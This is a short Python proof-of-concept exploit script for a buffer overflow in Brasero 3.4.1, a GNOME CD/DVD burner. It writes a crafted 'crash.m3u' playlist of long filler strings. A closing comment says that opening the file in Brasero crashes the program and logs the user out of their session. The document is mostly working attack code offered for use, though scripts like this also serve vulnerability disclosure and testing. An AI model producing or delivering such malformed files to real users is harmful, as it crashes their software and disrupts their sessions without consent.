#!/usr/bin/python

#Exploit title: Brasero 3.4.1 'm3u' Buffer Overflow POC
#Date Discovered: 15th March' 2015
# Exploit Author: Avinash Kumar Thapa "-Acid"
# Vulnerable Software: Brasero 3.4.1 CD/DVD for the Gnome Desktop
# Homepage:https://wiki.gnome.org/Apps/Brasero
# Tested on: Kali Linux 1.0.9

buffer ="A"*26109

buffer += "CCCC"

buffer += "D"*10500

file = "crash.m3u"

f = open(file, "w")

f.write(buffer)

f.close()

# After running exploit, run malicious file with brasero CD/DVD burner and check the crash which leads to logged out from your current session.
#####################################################################
# -Acid                                                             #
#####################################################################